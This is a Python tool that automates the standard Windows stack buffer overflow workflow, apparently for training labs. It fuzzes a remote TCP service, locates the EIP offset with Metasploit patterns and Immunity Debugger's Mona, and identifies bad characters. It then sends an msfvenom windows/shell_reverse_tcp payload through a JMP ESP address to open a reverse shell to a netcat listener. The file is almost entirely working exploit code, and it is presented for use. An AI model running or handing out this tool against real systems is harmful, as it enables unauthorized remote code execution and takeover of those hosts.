#!/usr/bin/python3

import socket, time, sys, subprocess
from pwn import *
import argparse

# Initiate the parser
parser = argparse.ArgumentParser()

# Add long and short argument
parser.add_argument("--rhost", "-rhost", help="set victim ip", required=True)
parser.add_argument("--rport", "-rport", help="set victim port", required=True, type=int)
parser.add_argument("--rcmd", "-rcmd", help="set command prefix to use on the BoF", default = '')
parser.add_argument("--rtime", "-rtime", help="timeout", default=5, type=int)

parser.add_argument("--lhost", "-lhost", help="set listener ip", required=True)
parser.add_argument("--lport", "-lport", help="set listener port", required=True, type=int)
parser.add_argument("--folder", "-F", help="Folder path in Mona default to c:\mona", default = "c:\\mona")

parser.add_argument("--buffer", "-B", help="set buffer length that cause BoF, this skips fuzzing", type=int)
parser.add_argument("--offset", "-O", help="set offset for EIP", type=int)
parser.add_argument("--no_eip_validation", "-W", help="skips validation of EIP overwrite", type=int)
parser.add_argument("--badchars", "-b", help="set known badchars")



# Read arguments from the command line
args = parser.parse_args()
RHOST = args.rhost
LHOST = args.lhost
RPORT = args.rport
LPORT = args.lport
RCMD = args.rcmd
RCMD = RCMD.encode()
RTIME = args.rtime

folderNameMona = args.folder
print(args.folder)

bypassfuzz = False
bypassfuzz_val = 0
bypassoffset = False
bypassoffset_val = 0
bypassrtnvalidation = False
bypassbadchars = False
bypassbadchars_val = b'\x00'

if args.buffer:
    bypassfuzz = True
    bypassfuzz_val = args.buffer

if args.offset:
    bypassoffset = True
    bypassoffset_val = args.offset

if args.badchars:
    bypassbadchars = True
    bypassbadchars_val = args.badchars

if args.no_eip_validation == '1':
    bypassrtnvalidation = True

# color stuff
COL_RESTORE = '\x1b[0m'
red = '\x1b[1;31m'
green = '\x1b[1;32m'
yellow = '\x1b[1;33m'
blue = '\x1b[1;34m'
pink = '\x1b[1;35m'

def banner():
    print("\x1b[1;34m                        ______________                    ")
    print("\x1b[1;34m                  ,===:'.,            `-._                ")
    print("\x1b[1;34m                       `:.`---.__         `-._            ")
    print("\x1b[1;34m                         `:.     `--.         `.          ")
    print("\x1b[1;34m                           \.        `.         `.        ")
    print("\x1b[1;34m                   (,,(,    \.         `.   ____,-`.,     ")
    print("\x1b[1;34m                (,'     `/   \.   ,--.___`.'              ")
    print("\x1b[1;34m            ,  ,'  ,--.  `,   \.;'         `              ")
    print("\x1b[1;34m             `{D, {    \  :    \;                         ")
    print("\x1b[1;34m               V,,'    /  /    //                         ")
    print("\x1b[1;34m               j;;    /  ,' ,-//.    ,---.      ,         ")
    print("\x1b[1;34m               \;'   /  ,' /  _  \  /  _  \   ,'/         ")
    print("\x1b[1;34m                     \   `'  / \  `'  / \  `.' /          ")
    print("\x1b[1;34m                      `.___,'   `.__,'   `.__,'           ")    
    print("\x1b[1;34m Contributors:           ")
    print("\x1b[1;34m  blu3drag0nsec / @blu3drag0nsec          ")
    print("\x1b[1;34m  ChevalierOnGithub / @Virtual_Lad          ")
    print("\x1b[0m ")  

allchars = bytearray(b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\
\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\
\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\
\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\
\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\
\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\
\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\
\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')

def generate_bad_chars(chars):
    curr = bytearray()

    for b in allchars:
        if b not in chars:
            curr.append(b)

    return curr

def verbose_hex(v):
    str = '"'
    for b in bytearray(v):    
        str += "\\x" + "{:02x}".format(b)
    str += '"'
    return str

def step(phase, arg1=None, arg2=None):
    if phase == 0:        
        print(red + "[+] ImmunityDebugger crashed (hopefully), restore it with CTRL+F2 followed by F9")        
        input(red + 'Press <enter> once done\n')
        print(COL_RESTORE)        
    if phase == 1:        
        print(red + "[+] Launch ImmunityDebugger as Administrator and load the executable")
        print(red + "[+] Ensure that the ImmunityDebugger status is 'Running'")
        input(red + 'Press <enter> once done\n')
        print(COL_RESTORE)        
    if phase == 2:
        print(green + '[+] Step #2 - Fuzz it')
        fuzzyBytes = fuzzyfuzzy(RHOST, RPORT, RTIME, RCMD)
        print(pink + '[-] Buffer brokedown at # bytes {}'.format(fuzzyBytes))
        print(COL_RESTORE)        
        return fuzzyBytes
    if phase == 3:
        print(green + '[+] Step #3 - Generate pattern of {} bytes'.format(arg1))        
        print(COL_RESTORE)        
        return generate_pattern(arg1)
    if phase == 4:
        print(green + '[+] Step #4 - Exploit phase 1')
        print(COL_RESTORE)        
        exploit(RHOST, RPORT, RTIME, RCMD, 0, arg1, b"", 0) # offset 0 and payload with the pattern
    if phase == 5:        
        print(green + '[+] Step #5 - Retrieve data from ImmunityDebugger Mona plugin')
        print(yellow + '[?] Execute the following commands on immunitydebugger cmdline:')
        print(yellow + '[?] !mona config -set workingfolder {}'.format(folderNameMona))
        print(yellow + '[?] !mona findmsp -distance {}'.format(arg1))
        offset = input(yellow + '[?] Find the message "EIP contains normal pattern : 0x.. (offset XXXX)", what is the offset value?\n')
        if offset == '':
            print(yellow + '[?] Unable to proceed without an offset, I''ll ask again and then I''ll give up ... ')
            offset = input(prefix + 'Find the message "EIP contains normal pattern : 0x.. (offset XXXX)", what is the offset value?\n')
            if offset == '':
                print(blue + '[+] BYEEEEEE!!!!')
                exit(1)        
        print(COL_RESTORE)        
        return offset
    if phase == 6:        
        print(green + '[+] Step #6 - Confirm EIP override')        
        print(COL_RESTORE)        
        exploit(RHOST, RPORT, RTIME, RCMD, int(arg1), b"", b"BBBB", 0) # offset and retn = BBBB

        offset = input(red + '[?] Immunity Debugger crashed again, check that EIP = "42424242", if not, stop using this script, something went wrong!!\nCan you confirm the EIP is correct (yes/no)?\n')                
        if 'yes' not in offset:
            print(red + '[+] If the answer is not "yes" then I''m sorry but you need to go back to manual approach ')                        
            exit(1)        
        print(COL_RESTORE)        
        return offset
    if phase == 7:        
        print(green + '[+] Step #7 - Onto finding the badchars\n')        
        print(green + '[+] Current list: {}'.format(verbose_hex(bytearray(arg2))))

        badcharlist = generate_bad_chars(arg2)        
        exploit(RHOST, RPORT, RTIME, RCMD, int(arg1), badcharlist, b"BBBB", 0) # offset and retn = BBBB        

        print(yellow + '[?] On ImmunityDebugger console run: ')
        print(yellow + '[?] !mona bytearray -b {}'.format(verbose_hex(bytearray(arg2))))
        print(yellow + '[?] On ImmunityDebugger retrieve the ESP register value and run this command:')
        print(yellow + '[?] !mona compare -f {}\\bytearray.bin -a <ESP>'.format(folderNameMona))        
        newchars = input(yellow + '[?] Provide the new badchars identified on mona, or enter if this is the complete list (r = repeat call): {}?\n'.format(verbose_hex(bytearray(arg2))))
        print(COL_RESTORE)        
        newchars = newchars.strip()
        step(0)        
        if newchars == '' or newchars == None:
            return arg2
        if newchars == 'r':
            return step(7, arg1, arg2)
        else:            
            return step(7, arg1, arg2 + bytearray.fromhex(newchars))

    else:
        return

def generate_pattern(size):
    pattern = subprocess.run(["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", str(size)], stdout=subprocess.PIPE)
    return pattern.stdout.strip()

def generate_shell(badchars):
    pattern = subprocess.run(["/usr/bin/msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} EXITFUNC=thread -b {} -f raw".format(LHOST, LPORT, badchars)], capture_output=True, shell=True)
    return pattern.stdout

def fuzzyfuzzy(ip, port, timeout = 5, command = b""):
    buffer = []
    counter = 100
    lastbuffer = -1

    while len(buffer) < 30:
        buffer.append(b"A" * counter)
        counter += 100

    for string in buffer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            connect = s.connect((ip, port))
            s.recv(1024)
            print(green + "[+] Fuzzing with %s bytes" % len(string))            
            s.send(command + string + b'\r\n')
            lastbuffer = len(string)
            s.recv(1024)            
            s.close()
        except:
            if lastbuffer == -1:
                print(pink + "[!] Unexpected error:", sys.exc_info())
                print(pink + "[!] Could not connect to " + ip + ":" + str(port))
            return lastbuffer + 400
        time.sleep(1)

def exploit(ip, port, timeout = 5, pprefix=b"", offset=0, ppayload=b"", pretn=b"", usePadding=0):

    prefix = b""
    if pprefix != b"":
        prefix = pprefix

    overflow = b"A" * offset

    retn = b""
    if pretn != b"":
        retn = pretn

    padding = b""
    if usePadding != 0:
        padding = b"\x90" * usePadding

    payload = b""
    if ppayload != b"":
        payload = ppayload

    postfix = b""

    buffer = prefix + overflow + retn + padding + payload + postfix
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((ip, port))
        print(green + "[!] Sending evil buffer...")
        s.send(buffer + b"\r\n")
        print(green + "[!] Done!")        
    except:
        print(pink + "[!] Could not connect.")

banner()

print(green + '[+] ##########################################')
print(green + '[+] Attack IP: {}, Attack PORT: {}, Timeout: {}'.format(RHOST, RPORT, RTIME))
print(green + '[+] Local IP: {}, Local PORT: {}'.format(LHOST, LPORT))
print(green + '[+] Mona folder: {}'.format(folderNameMona))
print(green + '[+] Command to send: "{}"'.format(RCMD))

if not bypassfuzz:
    step(1)
    fuzzy_overflow_bytes = step(2)
    step(0)
else:
    fuzzy_overflow_bytes = bypassfuzz_val

if not bypassoffset:
    pattern = step(3, fuzzy_overflow_bytes)
    step(4, pattern)
    offset = step(5, fuzzy_overflow_bytes) # crashed, get mona command
    step(0)
else:
    offset = bypassoffset_val

if not bypassrtnvalidation:
    step(6, offset)
    step(0)

if not bypassbadchars:
    badchars = step(7,offset, b"\x00")
else:
    badchars = bypassbadchars_val

print(pink + '[!] Badchars: {}'.format(verbose_hex(bytearray(badchars))))

print(yellow + '[?] Run on Mona:')
print(yellow + '[?] !mona jmp -r esp -cpb {}'.format(verbose_hex(bytearray(badchars))))
jmp = input(yellow + '[?] What is the first entry of the jump, type the address with "0x" 0x? \n')
jmp_hex = p32(int(jmp, 16))

shell = generate_shell(verbose_hex(bytearray(badchars)))

print(red + '[?] At this point make sure you have a nc listener setup `nc -lvnp PORT` ')
input(red + 'Press <enter> once done\n')
print(COL_RESTORE)        

exploit(RHOST, RPORT, RTIME, RCMD, int(offset), shell, jmp_hex, 16) # offset and retn = BBBB

exit(0)

